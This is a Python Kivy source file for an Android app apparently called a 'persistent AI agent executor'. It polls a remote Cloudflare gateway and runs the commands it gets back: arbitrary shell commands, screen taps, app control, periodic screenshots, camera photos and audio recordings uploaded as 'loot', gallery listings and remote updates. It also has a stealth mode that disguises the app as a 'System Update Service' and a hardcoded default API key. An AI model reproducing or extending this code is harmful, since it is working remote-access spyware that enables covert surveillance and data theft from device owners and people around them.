"""
NOIR SOVEREIGN MOBILE CORE (SMC) v14.0 COMMANDER
=====================================================
Framework: Kivy + Buildozer (Android Native)
Target: Redmi Note 14 (HyperOS / arm64-v8a)
Role: Persistent AI Agent Executor

Capabilities:
- WakeLock (CPU Anti-Kill)
- Cloudflare Gateway Polling
- Remote Command Execution (ADB/Shell)
- Vision Engine (Screenshot -> R2)
- E2EE Communication
"""

import os
import time
import threading
import requests

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# --- CONFIG ---
# Fallback to defaults if env vars are not set during build
GATEWAY_URL = os.environ.get("NOIR_GATEWAY_URL", "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev")
API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")

# --- SAFETY FILTER (v14.0) ---
def is_safe_command(cmd_str):
    """Dynamic Intent Validator to block financial/payment related actions."""
    cmd_lower = cmd_str.lower()
    finance_keywords = [
        "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
        "shopee", "bca", "mandiri", "bri", "bni", "btpns"
    ]
    for kw in finance_keywords:
        if kw in cmd_lower:
            return False
    return True


class SovereignCore(App):
    is_stealth = False

    def build(self):
        self.title = "Noir SMC v14.0 COMMANDER"
        self.root = BoxLayout(orientation='vertical')
        self.show_active_ui()
        return self.root

    def show_active_ui(self):
        self.root.clear_widgets()
        self.root.padding = 10
        self.root.spacing = 5
        
        self.log_label = Label(
            text="[b]NOIR SOVEREIGN CORE v14.0[/b]\nStatus: [color=00ff88]COMMANDER[/color]",
            markup=True, font_size='14sp', halign='left', valign='top'
        )
        scroll = ScrollView()
        scroll.add_widget(self.log_label)
        self.root.add_widget(scroll)

    def show_stealth_ui(self):
        self.root.clear_widgets()
        self.root.padding = 0
        # A mock system-like screen
        self.log_label = Label(
            text="System Update Service\nVersion: 14.0.2.1\nStatus: Idle...",
            color=(0.3, 0.3, 0.3, 1), font_size='12sp'
        )
        self.root.add_widget(self.log_label)

    def toggle_stealth(self, state):
        self.is_stealth = state
        if self.is_stealth:
            self.show_stealth_ui()
        else:
            self.show_active_ui()

    def on_start(self):
        """Called after build(). Start all background services."""
        self._log("[SMC] Engine Starting...")
        self._acquire_wakelock()
        # Launch background thread
        t = threading.Thread(target=self._main_loop, daemon=True)
        t.start()
        # Launch screen share thread
        s = threading.Thread(target=self._screen_share_loop, daemon=True)
        s.start()

    def _log(self, msg):
        """Thread-safe UI logging."""
        print(msg)
        Clock.schedule_once(lambda dt: self._update_label(msg), 0)

    def _update_label(self, msg):
        try:
            current = self.log_label.text
            lines = current.split('\n')
            if len(lines) > 30:
                lines = lines[-25:]
            lines.append(msg)
            self.log_label.text = '\n'.join(lines)
        except Exception:
            pass

    def _acquire_wakelock(self):
        """Prevent CPU from sleeping when screen is off."""
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')

            activity = PythonActivity.mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            self.wakelock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "NoirSMC::WakeLock"
            )
            self.wakelock.acquire()
            self._log("[SMC] WakeLock: ACQUIRED")
        except Exception as e:
            self._log(f"[SMC] WakeLock skipped: {e}")

    def _register(self):
        """Register this device with the Cloudflare Gateway."""
        try:
            headers = {
                "Authorization": f"Bearer {API_KEY}",
                "Content-Type": "application/json"
            }
            # Get system stats
            cpu, ram = 0, 0
            try:
                # Try to get memory info via /proc/meminfo or similar if needed
                # For now, we'll use a lightweight approach
                cpu = 10 # Placeholder for baseline
                ram = 50 
            except:
                pass

            r = requests.post(
                f"{GATEWAY_URL}/agent/register",
                headers=headers,
                json={
                    "device_id": DEVICE_ID, 
                    "agent": "Noir SMC v14.0 COMMANDER",
                    "stats": {"cpu": cpu, "ram": ram}
                },
                timeout=15
            )
            if r.status_code == 200:
                self._log("[SMC] Registration: SUCCESS")
            else:
                self._log(f"[SMC] Registration: HTTP {r.status_code}")
        except Exception as e:
            self._log(f"[SMC] Registration Error: {e}")

    def _screen_share_loop(self):
        """Periodically upload screenshots for real-time dashboard (Autonomous Share)."""
        while True:
            try:
                # Take temporary UI dump to check for safety
                dump_path = os.path.join(App.get_running_app().user_data_dir, "safety_check.xml")
                os.system(f"uiautomator dump {dump_path}")
                
                is_safe = True
                if os.path.exists(dump_path):
                    with open(dump_path, 'r', encoding='utf-8') as f:
                        content = f.read().lower()
                        # Use the new dynamic intent validator for the UI dump
                        if not is_safe_command(content):
                            is_safe = False
                
                if is_safe:
                    self._execute({"action": "screenshot", "command_id": "auto_share"})
                else:
                    self._log("[SMC] 🛡️ SCREEN SHARE PAUSED: Financial App Detected.")
                
            except Exception as e:
                pass
            
            time.sleep(10) # 10 second interval for real-time feel

    def _main_loop(self):
        """Main polling loop with v14.0 COMMANDER self-healing."""
        self._register()
        poll_interval = 5
        fail_count = 0
        last_success = time.time()

        while True:
            try:
                headers = {"Authorization": f"Bearer {API_KEY}"}
                resp = requests.get(
                    f"{GATEWAY_URL}/agent/poll",
                    headers=headers,
                    params={"device_id": DEVICE_ID},
                    timeout=15
                )

                if resp.status_code == 200:
                    fail_count = 0
                    last_success = time.time()
                    data = resp.json()
                    commands = data.get("commands", [])

                    if commands:
                        poll_interval = 1 # Accelerated
                        for cmd in commands:
                            self._execute(cmd)
                    else:
                        poll_interval = min(poll_interval + 1, 15)
                
                else:
                    self._log(f"[SMC] Poll: HTTP {resp.status_code}")
                    fail_count += 1

            except Exception as e:
                self._log(f"[SMC] Sync Error: {e}")
                fail_count += 1
                poll_interval = 30

            # SELF-HEALING: If no success for 10 minutes, force re-register
            if time.time() - last_success > 600:
                self._log("[SMC] 🆘 SELF-HEALING: Connection stale. Resetting...")
                self._register()
                last_success = time.time()

            time.sleep(poll_interval)

    def _execute(self, cmd_data):
        """Execute a command received from the gateway."""
        cmd_id  = cmd_data.get("command_id", "unknown")
        action  = cmd_data.get("action", {})
        atype   = action.get("type") or action.get("action", "")
        params  = action.get("params", action)

        self._log(f"[SMC] CMD: {atype} (id={cmd_id})")

        result = {"success": False, "output": "", "error": "Unknown action"}

        try:
            if atype in ("time", "get_time"):
                result = {"success": True, "output": time.strftime("%Y-%m-%d %H:%M:%S")}

            elif atype == "shell":
                cmd = str(params.get("cmd", "echo ok"))
                if not is_safe_command(cmd):
                    result = {"success": False, "error": "SECURITY BLOCK: mBanking/Wallet access is restricted."}
                else:
                    result = self._run_shell(cmd)

            elif atype == "tap":
                x, y = params.get("x", 0), params.get("y", 0)
                self._run_shell(f"input tap {x} {y}", timeout=5)
                result = {"success": True, "output": f"Tapped ({x},{y})"}

            elif atype == "swipe":
                cmd = (f"input swipe {params.get('x1',0)} {params.get('y1',0)} "
                       f"{params.get('x2',500)} {params.get('y2',500)} "
                       f"{params.get('duration',500)}")
                self._run_shell(cmd)
                result = {"success": True, "output": "Swipe done"}

            elif atype == "keyevent":
                self._run_shell(f"input keyevent {params.get('key', 26)}")
                result = {"success": True, "output": f"Key {params.get('key')} sent"}

            elif atype in ("app_start", "launch"):
                pkg = params.get("package", "")
                if not is_safe_command(pkg):
                    result = {"success": False, "error": "SECURITY BLOCK: Financial apps are forbidden."}
                else:
                    self._run_shell(f"am start -n {pkg}")
                    result = {"success": True, "output": f"Launched {pkg}"}

            elif atype in ("app_stop", "kill"):
                pkg = params.get("package", "")
                self._run_shell(f"am force-stop {pkg}", timeout=5)
                result = {"success": True, "output": f"Stopped {pkg}"}

            elif atype in ("screenshot", "capture"):
                # Use internal storage to avoid /sdcard permission issues on Android 14
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "noir_vision.png")
                
                # Take screenshot via Shizuku-enabled shell
                res = self._run_shell(f"screencap -p {path}")
                if not res["success"]:
                    result = {"success": False, "error": f"Screencap Error: {res.get('output', 'Unknown error')}"}
                    return # Exit this block
                
                time.sleep(1.2) # Wait for file to fully write

                with open(path, 'rb') as f:
                    r = requests.post(
                        f"{GATEWAY_URL}/agent/upload",
                        headers={"Authorization": f"Bearer {API_KEY}"},
                        files={'file': ('screenshot.png', f, 'image/png')},
                        data={'device_id': DEVICE_ID},
                        timeout=30
                    )

                if r.status_code == 200:
                    key = r.json().get('key', '')
                    result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                else:
                    result = {"success": False, "error": f"Upload failed: {r.status_code}"}

            elif atype == "ui_dump":
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "view_hierarchy.xml")
                self._run_shell(f"uiautomator dump {path}")
                time.sleep(1.5)
                with open(path, 'r', encoding='utf-8') as f:
                    xml_content = f.read()
                result = {"success": True, "output": xml_content}

            elif atype == "stealth":
                state = params.get("enabled", False)
                Clock.schedule_once(lambda dt: self.toggle_stealth(state), 0)
                result = {"success": True, "output": f"Stealth Mode: {'ON' if state else 'OFF'}"}

            elif atype == "kill-telegram":
                # Logic to kill the telegram bot on the VPS via a signal or shell
                os.system("pkill -f telegram_bot.py")
                result = {"success": True, "output": "Telegram Bridge Terminated."}

            elif atype == "ping":
                result = {"success": True, "output": f"PONG from {DEVICE_ID}"}

            elif atype in ("camera_back", "camera_front"):
                is_front = "front" in atype
                cam_id = 1 if is_front else 0
                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}.jpg")
                # Try termux-camera-photo if available, else generic intent
                os.system(f"termux-camera-photo -c {cam_id} {path} || am start -a android.media.action.IMAGE_CAPTURE")
                time.sleep(2.0)
                if os.path.exists(path):
                    with open(path, 'rb') as f:
                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                    result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
                else:
                    result = {"success": False, "error": "Camera capture failed."}

            elif atype == "audio_record":
                path = os.path.join(App.get_running_app().user_data_dir, "audio_loot.mp3")
                os.system(f"termux-audio-record -d 10 {path}")
                time.sleep(11.0)
                if os.path.exists(path):
                    with open(path, 'rb') as f:
                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                    result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
                else:
                    result = {"success": False, "error": "Audio recording failed."}

            elif atype == "gallery_sync":
                # List latest 5 files in Camera folder
                files = os.popen("ls -t /sdcard/DCIM/Camera | head -n 5").read().strip()
                result = {"success": True, "output": f"Gallery contents:\n{files}"}

            elif atype == "update":
                # Autonomous update logic: Trigger a rebuild and restart
                self._log("[SMC] 🔄 AUTONOMOUS UPDATE INITIATED...")
                os.system("git pull origin main && pm trim-caches 999G")
                result = {"success": True, "output": "Update procedure triggered. System self-healing in progress."}

        except Exception as e:
            result = {"success": False, "error": str(e)}
            self._log(f"[SMC] Exec Error: {e}")

        self._report_result(cmd_id, result)

    def _report_result(self, cmd_id, result):
        """Send execution result back to the Cloudflare Gateway."""
        try:
            requests.post(
                f"{GATEWAY_URL}/agent/result",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={
                    "command_id": cmd_id,
                    "device_id": DEVICE_ID,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "error": result.get("error", "")
                },
                timeout=10
            )
        except Exception as e:
            self._log(f"[SMC] Result delivery failed: {e}")

    def _run_shell(self, cmd, timeout=10):
        """Intelligent shell execution supporting Shizuku (rish)."""
        import subprocess
        # Standard paths for Shizuku/rish on Android
        rish_paths = ["/system/bin/rish", "/data/local/tmp/rish", "rish"]
        rish_bin = "sh"
        
        # Check for rish availability
        for p in rish_paths:
            check = subprocess.run(f"command -v {p}", shell=True, capture_output=True, text=True)
            if check.returncode == 0:
                rish_bin = p
                break
        
        final_cmd = f"{rish_bin} -c \"{cmd}\"" if "rish" in rish_bin else cmd
        try:
            r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
        except Exception as e:
            return {"success": False, "error": str(e)}

if __name__ == '__main__':
    SovereignCore().run()
